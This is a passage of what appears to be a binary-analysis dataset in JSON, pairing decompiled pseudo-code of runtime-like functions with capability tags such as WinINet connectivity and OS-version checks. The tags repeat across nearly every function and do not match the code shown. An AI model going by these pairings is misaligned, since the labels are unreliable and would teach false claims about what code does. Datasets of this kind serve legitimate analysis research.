        "decompiled_code": "\nvoid fcn.0040140b(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    int32_t iStack20;\n    \n    iStack20 = param_1;\n    uStack28 = 0x493fe0;\n    uStack32 = *in_FS_OFFSET;\n    uVar2 = *0x571ca8 ^ &uStack32;\n    *in_FS_OFFSET = &uStack32;\n    while( true ) {\n        uVar1 = *(param_1 + 0xc);\n        if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;\n        uStack24 = *(*(param_1 + 8) + uVar1 * 0xc);\n        *(param_1 + 0xc) = uStack24;\n        if (*(*(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {\n            fcn.00405f88(0x101, uVar2);\n            fcn.00403c6f();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 296
    },
    "004014a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004014a6(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    bool bVar3;\n    \n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if (iVar1 == 1) {\n        bVar3 = *(param_1 + 0x45c) == 2;\n    }\n    else {\n        if (iVar1 != 2) goto code_r0x0049dd73;\n        bVar3 = *(param_1 + 0x45c) == 0;\n    }\n    if (bVar3) {\n        return CONCAT31(Var2, 1);\n    }\ncode_r0x0049dd73:\n    return Var2 << 8;\n}\n",
        "token_count": 181
    },
    "004014b5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004014b5(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    bool bVar3;\n    \n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if (iVar1 == 1) {\n        bVar3 = *(param_1 + 0x45c) == 2;\n    }\n    else {\n        if (iVar1 != 2) goto code_r0x0049dda5;\n        bVar3 = *(param_1 + 0x45c) == 0;\n    }\n    if (bVar3) {\n        return CONCAT31(Var2, 1);\n    }\ncode_r0x0049dda5:\n    return Var2 << 8;\n}\n",
        "token_count": 181
    },
    "004014d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004014d8(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.004058a8(arg_ch);\n    if ((var_8h == 0) || (*(var_8h + 4) != 0x3a4)) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.004c86cf(arg_ch, arg_8h, 0, 3);\n    }\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return uVar1;\n}\n",
        "token_count": 197
    },
    "0040151e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040151e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    int16_t *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x24) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.00403675(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == 0x24)) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.004038a0(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x32), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        *(param_1 + 0x24) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 442
    },
    "0040153c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040153c(int32_t *param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        fcn.00404692();\n        fcn.00403fe4(*param_1);\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00401541": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401541(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        uVar3 = *(*(in_ECX + 0x14) + -8);\n        arg_8h[1] = *(*(in_ECX + 0x14) + -4);\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040117c(in_ECX + 0x464 + uVar1 * 0x10, 4, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        puVar2 = *(in_ECX + 0x46c + uVar1 * 0x10);\n        uVar3 = puVar2[1];\n        *arg_8h = *puVar2;\n        arg_8h[1] = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 364
    },
    "0040155f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040155f(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004028c4(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        iVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 345
    },
    "00401578": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401578(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00405fec(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 350
    },
    "0040162c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040162c(int32_t *arg_8h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        cVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004038a0(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        cVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    return CONCAT31(cVar1 >> 7, 1);\n}\n",
        "token_count": 348
    },
    "0040164f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040164f(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    \n    if ((*param_1[7] != 0) && (piVar1 = param_1[0xb],  0 < *piVar1)) {\n        *piVar1 = *piVar1 + -1;\n        puVar2 = *param_1[7];\n        *param_1[7] = puVar2 + 1;\n        return *puVar2;\n    }\n    pcVar3 = *(*param_1 + 0x1c);\n    (**0x578000)();\n    uVar4 = (*pcVar3)();\n    return uVar4;\n}\n",
        "token_count": 183
    },
    "0040168b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.0040168b(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack64;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x418270;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    for (iStack64 = 6; 0 < iStack64; iStack64 = iStack64 + -1) {\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"nalbxgafjxczsppfsj\");\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 209
    },
    "004016ae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004016ae(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t **in_ECX;\n    \n    piVar1 = *in_ECX;\n    if (piVar1[2] == piVar1[1]) {\n        if (*(piVar1 + 3) == '\\0') {\n            *arg_ch = -1;\n        }\n        else {\n            *arg_ch = *arg_ch + 1;\n        }\n        uVar2 = *in_ECX & 0xffffff00 | *(*in_ECX + 3);\n    }\n    else {\n        *arg_ch = *arg_ch + 1;\n        (*in_ECX)[2] = (*in_ECX)[2] + 1;\n        ***in_ECX = arg_8h;\n        piVar1 = *in_ECX;\n        *piVar1 = *piVar1 + 2;\n        uVar2 = CONCAT31(piVar1 >> 8, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 243
    },
    "00401717": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401717(uint *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint unaff_ESI;\n    float var_58h;\n    uint32_t var_54h;\n    float var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    cVar1 = **0x574458;\n    if (cVar1 == '\\0') {\n        fcn.004017df(1);\n        goto code_r0x0048f976;\n    }\n    if (('/' < cVar1) && (cVar1 < ':')) {\n        *0x574458 = *0x574458 + 1;\n        fcn.0040127b(cVar1 + -0x2f, cVar1 + -0x2f >> 0x1f);\n        goto code_r0x0048f976;\n    }\n    fcn.00401906(&var_58h);\n    if (var_50h._0_1_ == '\\0') {\ncode_r0x0048f94c:\n        if (**0x574458 == '\\0') {\n            puVar2 = fcn.004017df(1);\n            uVar3 = *puVar2;\n        }\n        else {\n            uVar3 = 0;\n            var_4ch = 2;\n            var_50h = 0.0;\n            puVar2 = &var_50h;\n        }\n        *arg_8h = uVar3;\n        arg_8h[1] = puVar2[1];\n    }\n    else {\n        *0x574458 = *0x574458 + 1;\n        var_50h = var_58h;\n        var_4ch = var_54h;\n        if (arg_ch != 0x42) {\n            if (arg_ch != 0x41) goto code_r0x0048f94c;\n            var_58h = SUB84(var_58h, 0);\n        }\n        fcn.004055b5(&var_48h, 0x41, 0x5557d4, var_58h);\n        var_4ch = var_4ch & 0xffffff00;\n        fcn.0040328d(&var_48h);\n    }\ncode_r0x0048f976:\n    fcn.004030bc(unaff_ESI);\n    return;\n}\n",
        "token_count": 587
    },
    "00401785": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401785(uint arg_8h)\n\n{\n    int32_t iStack44;\n    \n    for (iStack44 = 0x4c; 0 < iStack44; iStack44 = iStack44 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    return;\n}\n",
        "token_count": 82
    },
    "00401794": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.00401794(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f588, 0xc);\n    if ((*(unaff_EBP + 0x10) != 0) && (*(unaff_EBP + 0x14) != 0)) {\n        lpCriticalSection = *(unaff_EBP + 0x18);\n        if (lpCriticalSection != 0) {\n            *(unaff_EBP + -0x1c) = 0;\n            fcn.004013f7(lpCriticalSection);\n            *(unaff_EBP + -4) = 0;\n            uVar2 = fcn.004013d4(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                                 lpCriticalSection);\n            *(unaff_EBP + -0x1c) = uVar2;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.004b0acb();\n            goto code_r0x004b0a7c;\n        }\n        if (*(unaff_EBP + 0xc) != -1) {\n            fcn.00403189(*(unaff_EBP + 8), 0, *(unaff_EBP + 0xc));\n        }\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    uVar2 = 0;\ncode_r0x004b0a7c:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 490
    },
    "00401799": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00401799(int32_t *arg_8h, uint8_t **arg_ch, int32_t *arg_10h)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint32_t uVar8;\n    uint8_t uVar9;\n    int32_t *piVar10;\n    uint32_t uVar11;\n    int32_t *piVar12;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint8_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_5h;\n    uint var_1h;\n    \n    cVar2 = fcn.00403d96();\n    if (cVar2 == '\\0') {\n        return 7;\n    }\n    puVar7 = *arg_ch;\n    uVar9 = *puVar7;\n    puVar1 = puVar7;\n    while( true ) {\n        *arg_ch = puVar1 + 1;\n        var_5h = var_5h & 0xffffff00 | uVar9;\n        iVar4 = fcn.00403d4b(uVar9, 8, arg_8h);\n        if (iVar4 == 0) break;\n        puVar1 = *arg_ch;\n        uVar9 = *puVar1;\n    }\n    piVar10 = arg_10h + 0xc2;\n    *piVar10 = var_5h == 0x2d;\n    if ((var_5h == 0x2d) || (var_5h == 0x2b)) {\n        var_5h._0_1_ = **arg_ch;\n        var_5h = var_5h & 0xffffff00 | var_5h;\n        *arg_ch = *arg_ch + 1;\n    }\n    if ((var_5h == 0x49) || (var_5h == 0x69)) {\n        uVar8 = fcn.0040332d(&var_5h, arg_ch, puVar7);\n        return uVar8;\n    }\n    if ((var_5h == 0x4e) || (var_5h == 0x6e)) {\n        uVar8 = fcn.00405673(&var_5h, arg_ch, puVar7);\n        return uVar8;\n    }\n    var_ch = 0;\n    var_1h._0_1_ = 0;\n    var_14h = puVar7;\n    if (var_5h == 0x30) {\n        var_14h = *arg_ch;\n        uVar9 = *var_14h;\n        var_18h = var_18h & 0xffffff00 | uVar9;\n        *arg_ch = var_14h + 1;\n        if ((uVar9 == 0x78) || (uVar9 == 0x58)) {\n            var_5h._0_1_ = var_14h[1];\n            var_1h._0_1_ = 1;\n            var_5h = var_5h & 0xffffff00 | var_5h;\n            *arg_ch = var_14h + 2;\n        }\n        else {\n            fcn.00402e0a(var_18h);\n            var_14h = puVar7;\n        }\n    }\n    uVar8 = var_5h;\n    piVar5 = arg_10h + 2;\n    if (var_5h == 0x30) {\n        uVar8 = 0x100;\n        do {\n            uVar9 = **arg_ch;\n            uVar8 = uVar8 & 0xffffff00 | uVar9;\n            var_5h = var_5h & 0xffffff00 | uVar9;\n            *arg_ch = *arg_ch + 1;\n        } while (uVar9 == 0x30);\n    }\n    uVar11 = ((var_1h == 0) - 1 & 6) + 9;\n    piVar12 = piVar5;\n    while( true ) {\n        cVar2 = uVar8;\n        if (cVar2 - 0x30U < 10) {\n            uVar6 = cVar2 - 0x30;\n        }\n        else if (cVar2 + 0x9fU < 0x1a) {\n            uVar6 = cVar2 - 0x57;\n        }\n        else if (cVar2 + 0xbfU < 0x1a) {\n            uVar6 = cVar2 - 0x37;\n        }\n        else {\n            uVar6 = 0xffffffff;\n        }\n        if (uVar11 < uVar6) break;\n        if (piVar12 != piVar10) {\n            *piVar12 = uVar6;\n            piVar12 = piVar12 + 1;\n        }\n        var_ch = var_ch + 1;\n        uVar9 = **arg_ch;\n        uVar8 = CONCAT11(1, uVar9);\n        var_5h = var_5h & 0xffffff00 | uVar9;\n        *arg_ch = *arg_ch + 1;\n    }\n    iVar4 = 0;\n    if (cVar2 == ***(*arg_8h + 0x88)) {\n        uVar9 = **arg_ch;\n        puVar7 = *arg_ch + 1;\n        uVar8 = uVar8 & 0xffffff00 | uVar9;\n        var_5h = var_5h & 0xffffff00 | uVar9;\n        *arg_ch = puVar7;\n        if ((piVar12 == piVar5) && (uVar9 == 0x30)) {\n            uVar8 = 0x100;\n            do {\n                uVar9 = *puVar7;\n                uVar8 = uVar8 & 0xffffff00 | uVar9;\n                var_ch = var_ch + -1;\n                puVar7 = puVar7 + 1;\n                var_5h = var_5h & 0xffffff00 | uVar9;\n                *arg_ch = puVar7;\n            } while (uVar9 == 0x30);\n        }\n        while( true ) {\n            cVar2 = uVar8;\n            if (cVar2 - 0x30U < 10) {\n                uVar6 = cVar2 - 0x30;\n            }\n            else if (cVar2 + 0x9fU < 0x1a) {\n                uVar6 = cVar2 - 0x57;\n            }\n            else if (cVar2 + 0xbfU < 0x1a) {\n                uVar6 = cVar2 - 0x37;\n            }\n            else {\n                uVar6 = 0xffffffff;\n            }\n            if (uVar11 < uVar6) break;\n            if (piVar12 != piVar10) {\n                *piVar12 = uVar6;\n                piVar12 = piVar12 + 1;\n            }\n            uVar9 = **arg_ch;\n            uVar8 = CONCAT11(1, uVar9);\n            var_5h = var_5h & 0xffffff00 | uVar9;\n            *arg_ch = *arg_ch + 1;\n        }\n    }\n    if (uVar8 >> 8 == '\\0') {\n        fcn.00402e0a(var_5h);\n        *arg_ch = var_14h;\n        if (var_1h != 0) {\n            return 2;\n        }\n        return 7;\n    }\n    fcn.00402e0a(var_5h);\n    puVar1 = *arg_ch;\n    uVar9 = *puVar1;\n    puVar7 = puVar1 + 1;\n    uVar8 = var_5h & 0xffffff00;\n    var_5h = uVar8 | uVar9;\n    *arg_ch = puVar7;\n    if (uVar9 == 0x45) {\ncode_r0x004b4c1e:\n        uVar3 = var_1h ^ 1;\n    }\n    else {\n        if (uVar9 != 0x50) {\n            if (uVar9 == 0x65) goto code_r0x004b4c1e;\n            uVar3 = 0;\n            if (uVar9 != 0x70) goto code_r0x004b4c23;\n        }\n        uVar3 = var_1h;\n    }\ncode_r0x004b4c23:\n    if (uVar3 != 0) {\n        uVar9 = *puVar7;\n        uVar11 = uVar9 << 8;\n        *arg_ch = puVar1 + 2;\n        if ((uVar9 == 0x2b) || (uVar11 = CONCAT11(uVar9, uVar9),  uVar9 == 0x2d)) {\n            uVar9 = puVar1[2];\n            uVar11 = uVar11 & 0xffffff00 | uVar9;\n            *arg_ch = puVar1 + 3;\n        }\n        var_5h = uVar8 | uVar9;\n        uVar8 = uVar9;\n        if (uVar11 == '0') {\n            uVar8 = 0x100;\n            do {\n                uVar9 = **arg_ch;\n                uVar8 = uVar8 & 0xffffff00 | uVar9;\n                var_5h = var_5h & 0xffffff00 | uVar9;\n                uVar11 = uVar11 & 0xffffff00 | uVar9;\n                *arg_ch = *arg_ch + 1;\n            } while (uVar9 == 0x30);\n        }\n        while( true ) {\n            cVar2 = uVar11;\n            if (cVar2 - 0x30U < 10) {\n                uVar6 = cVar2 - 0x30;\n            }\n            else if (cVar2 + 0x9fU < 0x1a) {\n                uVar6 = cVar2 - 0x57;\n            }\n            else if (cVar2 + 0xbfU < 0x1a) {\n                uVar6 = cVar2 - 0x37;\n            }\n            else {\n                uVar6 = 0xffffffff;\n            }\n            if (9 < uVar6) goto code_r0x004b4cc2;\n            uVar8 = CONCAT11(1, uVar8);\n            iVar4 = iVar4 * 10 + uVar6;\n            if (0x1450 < iVar4) break;\n            uVar9 = **arg_ch;\n            uVar8 = CONCAT11(1, uVar9);\n            var_5h = var_5h & 0xffffff00 | uVar9;\n            uVar11 = uVar11 & 0xffffff00 | uVar9;\n            *arg_ch = *arg_ch + 1;\n        }\n        iVar4 = 0x1451;\ncode_r0x004b4cc2:\n        while( true ) {\n            cVar2 = uVar11;\n            if ((uVar8 < '0') || ('9' < cVar2)) {\n                if (cVar2 + 0x9fU < 0x1a) {\n                    uVar6 = cVar2 - 0x57;\n                }\n                else if (cVar2 + 0xbfU < 0x1a) {\n                    uVar6 = cVar2 - 0x37;\n                }\n                else {\n                    uVar6 = 0xffffffff;\n                }\n            }\n            else {\n                uVar6 = cVar2 - 0x30;\n            }\n            if (9 < uVar6) break;\n            uVar9 = **arg_ch;\n            uVar8 = uVar8 & 0xffffff00 | uVar9;\n            var_5h = var_5h & 0xffffff00 | uVar9;\n            uVar11 = uVar11 & 0xffffff00 | uVar9;\n            *arg_ch = *arg_ch + 1;\n        }\n        if (uVar11 >> 8 == '-') {\n            iVar4 = -iVar4;\n        }\n        if (uVar8 >> 8 == '\\0') {\n            fcn.00402e0a(var_5h);\n            *arg_ch = puVar1;\n            var_5h = var_5h & 0xffffff00 | *puVar1;\n            *arg_ch = puVar7;\n        }\n    }\n    fcn.00402e0a(var_5h);\n    if (piVar12 != piVar5) {\n        do {\n            if (*(piVar12 + -1) != '\\0') break;\n            piVar12 = piVar12 + -1;\n        } while (piVar12 != piVar5);\n        if (piVar12 != piVar5) {\n            if (0x1450 < iVar4) {\n                return 9;\n            }\n            if (-0x1451 < iVar4) {\n                iVar4 = iVar4 + (((var_1h == 0) - 1 & 3) + 1) * var_ch;\n                if (0x1450 < iVar4) {\n                    return 9;\n                }\n                if (-0x1451 < iVar4) {\n                    *arg_10h = iVar4;\n                    arg_10h[1] = piVar12 - piVar5;\n                    return var_1h;\n                }\n            }\n            return 8;\n        }\n    }\n    return 2;\n}\n",
        "token_count": 3096
    },
    "004017a3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004017a3(uint arg_8h)\n\n{\n    if (*0x574249 == '\\0') {\n        *0x574249 = '\\x01';\n        fcn.00403a85(fcn.00465b6f);\n    }\n    *0x57423c = arg_8h;\n    return;\n}\n",
        "token_count": 77
    },
    "004017b7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
